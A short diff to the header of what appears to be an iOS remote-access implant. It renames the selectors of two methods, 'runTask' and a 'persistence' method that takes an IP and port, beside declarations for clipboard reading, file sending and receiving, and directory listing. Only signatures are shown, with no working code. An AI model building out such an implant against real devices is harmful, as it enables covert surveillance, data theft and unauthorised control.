@@ -52,7 +52,7 @@ extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean su
 -(void)showAlert:(NSString *)args;
 -(void)changeDirectory:(NSString *)dir;
 -(void)getPasteBoard;
--(void)runTask:(NSString *)cmd :(bool)sendTerm;
+-(void)runTask:(NSString *)cmd sendTerminal:(bool)sendTerm;
 -(void)sendFile:(NSString *)path;
 -(void)receiveFile:(NSString *)args;
 -(void)openURL:(NSString *)arg;
@@ -62,7 +62,7 @@ extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean su
 -(void)tabComplete:(NSString *)path;
 -(void)listDirectory:(NSString *)path;
 -(NSDictionary *)getDirectoryContents:(NSString *)path;
--(void)persistence:(NSString *)args :(NSString *)ip :(int)port;
+-(void)persistence:(NSString *)args withIP:(NSString *)ip andPort:(int)port;
 -(void)getProcessId;
 -(void)getBattery;
 -(void)getVolume;
